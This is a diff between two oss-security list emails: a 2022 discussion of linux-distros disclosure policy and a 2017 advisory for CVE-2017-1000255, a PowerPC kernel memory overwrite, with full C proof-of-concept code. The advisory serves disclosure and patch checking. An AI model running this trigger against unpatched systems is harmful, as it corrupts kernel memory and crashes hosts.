@@ -1,4 +1,9 @@
-Received: (qmail 30577 invoked by uid 550); 15 May 2022 16:28:10 -0000
+X-VM-v5-Data: ([nil t nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	["3804" "Tuesday" "10" "October" "2017" "15:13:29" "+1100" "Michael Ellerman" "mpe@ellerman.id.au" "<87fuary712.fsf@concordia.ellerman.id.au>" "129" "[oss-security] CVE-2017-1000255: Linux: powerpc: kernel memory overwrite in transactional memory handling" nil nil nil "10" "2017101004:13:29" "[oss-security] CVE-2017-1000255: Linux: powerpc: kernel memory overwrite in transactional memory handling" (number mark "U       mpe@ellerman Oct 10  129/3804  " thread-indent "\"[oss-security] CVE-2017-1000255: Linux: powerpc: kernel memory overwrite in transactional memory handling\"\n") nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil nil]
+	nil)
+X-Mozilla-Status: 0000
+X-Mozilla-Status2: 00000000
+Received: (qmail 19622 invoked by uid 550); 10 Oct 2017 09:56:07 -0000
 Mailing-List: contact oss-security-help@lists.openwall.com; run by ezmlm
 Precedence: bulk
 List-Post: <mailto:oss-security@lists.openwall.com>
@@ -7,161 +12,143 @@ List-Unsubscribe: <mailto:oss-security-unsubscribe@lists.openwall.com>
 List-Subscribe: <mailto:oss-security-subscribe@lists.openwall.com>
 List-ID: <oss-security.lists.openwall.com>
 Reply-To: oss-security@lists.openwall.com
-Received: (qmail 30341 invoked from network); 15 May 2022 16:27:51 -0000
-Date: Sun, 15 May 2022 18:27:40 +0200
-From: Solar Designer <solar@openwall.com>
-To: oss-security@lists.openwall.com
-Message-ID: <20220515162740.GA20526@openwall.com>
-Mime-Version: 1.0
-Content-Type: text/plain; charset=us-ascii
-Content-Disposition: inline
-User-Agent: Mutt/1.4.2.3i
-Subject: [oss-security] linux-distros list policy and Linux kernel
+Received: (qmail 25756 invoked from network); 10 Oct 2017 04:14:16 -0000
+From: Michael Ellerman <mpe@ellerman.id.au>
+To: oss-security@lists.openwall.com <oss-security@lists.openwall.com>
+Cc: cyrilbur@gmail.com <cyrilbur@gmail.com>, Gustavo Romero  <gromero@linux.vnet.ibm.com>, leitao@debian.org <leitao@debian.org>
+Date: Tue, 10 Oct 2017 15:13:29 +1100
+Message-ID: <87fuary712.fsf@concordia.ellerman.id.au>
+MIME-Version: 1.0
+Content-Type: multipart/signed; boundary="=-=-=";
+	micalg=pgp-sha1; protocol="application/pgp-signature"
+Subject: [oss-security] CVE-2017-1000255: Linux: powerpc: kernel memory overwrite in transactional memory handling
 
-Hi,
+--=-=-=
+Content-Type: text/plain
 
-This is a lengthy and belated message, yet I think is something we need
-to discuss in here.
+On Linux running on PowerPC hardware (Power8 or later) a user process can craft
+a signal frame and then do a sigreturn so that the kernel will take an exception
+(interrupt), and use the r1 value from the signal frame as the kernel stack
+pointer. As part of the exception entry the content of the signal frame is
+written to the kernel stack, allowing an attacker to overwrite arbitrary
+locations with arbitrary values. The exception handling does produce an oops,
+and a panic if panic_on_oops=1, but only after kernel memory has been over
+written.
 
-Context:
+The bug was introduced in commit:
 
-(linux-)distros list policy is generally to treat as public issues for
-which a fix is public.  For issues that haven't yet been brought to
-(linux-)distros, this means they shouldn't be - and instead should be
-brought to oss-security right away.  For issues that have been on
-(linux-)distros, this means an oss-security posting is to be made as
-soon as a fix is made public.
+    5d176f751ee3 ("powerpc: tm: Enable transactional memory (TM) lazily for userspace")
 
-This works well for most distros (where releasing a package update
-generally implies documenting the update's known security relevance at
-the same time) and for (linux-)distros list interactions with most
-projects, with the major exception being the Linux kernel.
+Which was merged upstream into v4.9-rc1.
 
-For Linux kernel maintainers, it is customary to post a fix technically
-publicly but without indication of its security relevance, then work on
-getting it merged into the various trees, and expect that its security
-relevance wouldn't be clearly indicated publicly for a while.
+Kernels built with CONFIG_PPC_TRANSACTIONAL_MEM=n are not vulnerable.
 
-I didn't keep track of statistics, but my impression was that in the
-last few years for issues handled with linux-distros involved, the
-maintainers usually reluctantly accepted linux-distros' way of handling
-them - didn't insist that the reporter would post e.g. to netdev before
-a "final" patch is ready, agreed on and honored coordinated release
-dates, and didn't object to linux-distros members asking the reporter to
-post about the issue to oss-security on the same day that a posting to a
-Linux kernel list is made.  I was grateful for that, especially knowing
-that some of this is an inconvenience/overhead for the maintainers.
+The bug is fixed upstream in commit:
 
-The handling was still often problematic (somehow way worse than for
-other projects, in my impression), but that appeared to be because
-discoverers/reporters were not familiar with the procedure and with our
-expectations, or/and because our policy and thus expectations were
-counter-intuitive for them (I admit this could mean that we were wrong
-in having such unexpected policy).  This also suggested that many didn't
-fully read or didn't understand our published policy before posting to
-linux-distros, which I tried to address by adding clarifications, some
-emphasized in bold and eventually even in ALL CAPS (not as shouting, but
-to make these parts less likely overlooked).
+  265e60a170d0 ("powerpc/64s: Use emergency stack for kernel TM Bad Thing program checks")
 
-Somehow it seems to have gotten worse this year.  In handling of an
-issue in February, a reporter planned to ignore our policy after having
-already shared an issue with linux-distros, and a list member from a
-major distro tried to enforce the policy.  In discussion that followed,
-a kernel maintainer (someone I have a lot of respect for, and who I
-think is also on the kernel security team?) said he had directed the
-reporter to share the issue with linux-distros despite of the reporter's
-explicit concerns and non-acceptance of the policy, expecting that
-linux-distros members would be "reasonable" and won't actually enforce
-the "unreasonable" policy (I don't recall the exact wording used, but
-that's the gist of it).  So it was not a case of something unexpected
-being overlooked by someone new - it was a case of the policy being
-deliberately violated by someone very experienced.  (Moreover, we also
-got accused of shouting with the ALL CAPS.)
+  https://git.kernel.org/linus/265e60a170d0a0ecfc2d20490134ed2c48dd45ab
 
-linux-distros members and Linux kernel security team didn't arrive at an
-agreement on how to handle further issues, planning to bring this up for
-discussion on oss-security - which I am finally doing now.  Meanwhile,
-the handling was hectic - indeed, people felt discouraged from enforcing
-the policy.  Another kernel maintainer also mentioned he's no longer
-directing people to linux-distros (which I find more reasonable than
-coercing/expecting linux-distros not to enforce a published policy).
+Which will appear in 4.14-rc5 when it is released.
 
-Question:
+A test case is available below.
 
-Should we address this incompatibility in desired handling of issues by
-the distros vs. kernel teams, and how?
+This issue was discovered by Gustavo Romero, Breno Leitao, Paul Mackerras, Cyril
+Bur and Michael Ellerman.
 
-Options:
+cheers
 
-Off the top of my head, we can do one of:
 
-0. Do nothing specific - let things work or fail on their own.
+diff --git a/tm-bad-stack.c b/tm-bad-stack.c
+new file mode 100644
+index 000000000000..c2b4a25230cb
+--- /dev/null
++++ b/tm-bad-stack.c
+@@ -0,0 +1,65 @@
++/*
++ * Build with:
++ *   gcc -Wall -Werror -O2 -o tm-bad-stack tm-bad-stack.c
++ *
++ * Both patched and unpatched kernels will print an oops and kill the test case.
++ * However unpatched kernels will display a message about a bad kernel stack
++ * pointer, including the R1_VALUE defined below. eg. When the test case is
++ * built 64-bit:
++ *
++ *   Bad kernel stack pointer 5deaddeaddead000 at c00000000000becc
++ *
++ * A patched kernel should not have any "Bad kernel stack" messages, eg:
++ *
++ *  $ dmesg | grep -i "bad kernel stacK"
++ *
++ * Should return no matches.
++ *
++ * Copyright 2017, IBM Corp
++ * Licensed under GPLv2.
++ */
++
++#include <stdlib.h>
++#include <stdio.h>
++#include <signal.h>
++#include <unistd.h>
++
++
++#ifdef __powerpc64__
++#define regs(_ucp)	((_ucp)->uc_mcontext.gp_regs)
++#define R1_VALUE	0x5deaddeaddead000ul
++#else
++#define regs(_ucp)	((_ucp)->uc_mcontext.uc_regs->gregs)
++#define R1_VALUE	0x5deaddedul
++#endif
++
++void signal_usr1(int signum, siginfo_t *info, void *uc)
++{
++	ucontext_t *ucp = uc;
++
++	/* Link tm checkpointed context to normal context */
++	ucp->uc_link = ucp;
++
++	/* Clear MSR[TM] */
++	regs(ucp)[PT_MSR] &= ~(1ULL << 32);
++	/* Set MSR[TS] = 0b10 */
++	regs(ucp)[PT_MSR] |= (2ULL << 33);
++	regs(ucp)[PT_R1] = R1_VALUE;
++}
++
++int main(void)
++{
++	struct sigaction act;
++
++	act.sa_sigaction = signal_usr1;
++	sigemptyset(&act.sa_mask);
++	act.sa_flags = SA_SIGINFO;
++	if (sigaction(SIGUSR1, &act, NULL) < 0) {
++		perror("sigaction sigusr1");
++		exit(1);
++	}
++
++	raise(SIGUSR1);
++
++	return 0;
++}
 
-1. Adjust linux-distros policy to allow "embargoes" on publicly fixed
-Linux kernel issues.  (Only for Linux kernel, not for other projects.)
+--=-=-=
+Content-Type: application/pgp-signature; name="signature.asc"
 
-However, besides not posting to oss-security this probably means also
-not releasing distro kernel updates until the "embargo" is over (when
-the changes hit a stable tree maybe?), thus exposing most Linux users to
-vulnerabilities that some attackers can infer from Linux kernel mailing
-lists and git commits.
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1
 
-The current policy:
-
-https://oss-security.openwall.org/wiki/mailing-lists/distros#list-policy-and-instructions-for-reporters
-
-already includes an exception in:
-
-"Please note that in case a fix for an issue is already in a publicly
-accessible source code repository, we generally consider the issue
-public (and thus you should post to oss-security right away, not report
-the issue to (linux-)distros as we'd merely redirect you to oss-security
-anyway and insist that you make the required posting ASAP).  There can
-be occasional (rare) exceptions to this, such as if the publicly
-accessible fix doesn't look like it's for a security issue (e.g., if the
-corresponding changes were initially made for unrelated reasons and were
-only later realized to have fixed a non-public security issue) and not
-revealing this publicly right away is somehow desirable.  You'd have to
-have very sound reasoning to claim an exception like this and be
-prepared to lose your argument and if so to post to oss-security ASAP
-anyway."
-
-This currently talks about fixes that are already public at the time of
-reporting to (linux-)distros, it requires "very sound reasoning", and it
-allows (linux-)distros to insist that the issue be made public ASAP.
-
-In my understanding, the Linux kernel folks want an exception like this
-also for publicly fixing issues already being handled with linux-distros
-involved, and to have the exception granted unconditionally with no way
-for linux-distros not to agree to it in a given case.  (Please correct
-me if I misunderstand.)
-
-2. Strictly enforce the policy as it is - and be in conflict with Linux
-kernel security team, and handle fewer issues via linux-distros.
-
-As a sub-option, also suggest that if a reporter or/and upstream does
-not accept the policy, they can nevertheless use the list to establish
-direct communication with interested distros - post a vague message like
-"I found a [type, impact] vulnerability in the Linux kernel [versions,
-subsystem], but I don't accept the list policy - please contact me
-directly if you'd like to receive the details on my terms anyway."
-Maybe with or without the clarifications I put in square brackets there.
-
-3. Ask that Linux kernel issues not be reported to linux-distros at all.
-This is unnecessarily limiting compared to option 2 above, but maybe not
-so conflicting (just not using this specific medium for communication).
-However, I think it won't work consistently - it would be too
-unexpected by many (indeed, out of context it sounds plain ridiculous),
-and linux-distros is referenced in older Linux kernel release trees.
-More importantly, both teams actually want to communicate on issues
-somewhere, and there isn't a good alternative currently.
-
-4. Shut down the list.  (What about the non-Linux distros list, then?)
-I need to migrate the setup soon and ideally also update it later, so
-shutting it down is as simple as not putting more effort into it.  It's
-been around for 11 years.
-
-I don't like any of these options.  Any other ideas?  Any ways to make
-option 1 more reasonable?
-
-Alexander
+iQIcBAEBAgAGBQJZ3EjqAAoJEFHr6jzI4aWAQZwP/1Y5SGh9jAj+Hlh25xjVxqhQ
+FQnSma1pRad/vyIQjeFzdT9v3BiSVuO7XsB7I0FU2iWdIJPFV0S0cf1Bm/nflTF7
+/9HPVB3II/FAIQ2lZpVIRexiVsQDUgR4IU6++lVOQB4CGS/TzRYb9a6Qodj581kr
+YsN0nFuf7ndcjGgUlEyFbxGLXt4BesSeQEr3z0Z/oKIt1TyDCh3kEmZq4zL2l6GB
+Kt/+W7VqvHeGzhx8WjI8V83f0oqCQDebouAeiOUONeO7o6ou/tsD4JJJlYyGdKEg
+glZYiNWhTEiG/gj/pRuGO/1N6IrY8i+EmYE42Nca7WRTKgdzVMG8haFjiJsQG+Jr
+ed5QDLhsSxuKezxILH/Ah6Qy3wVKNXRF31XqxuiWfwlvhIn9BU6QpIGguUNZpC54
+3sahXIczw9+lLI9WW1d+w1ebCp/xyac5x/8W2eZcgbeEWUT1+AsItDUJhVFOgGb1
+b33O5YuS6eqnKmsBbUdLYZia1MlO7MP1fMOh0nvw9VL9GeKxdkG0aqYpgJ6ZiyoI
+TTBTzUDBHD7YOkxBqlDddEodT3CcLPCirN1HLYRYHbSQ45B0XomQMBE4S1zDaz9J
+BE2l2d0OpT/YUjE5gGZOpkA/ZEbaj4/HV8x4cdxxPf96F+8xEmW2KFvbGGFBp9j7
+9x+kaXcvYUdQQl0L9M7E
+=5kKd
+-----END PGP SIGNATURE-----
+--=-=-=--
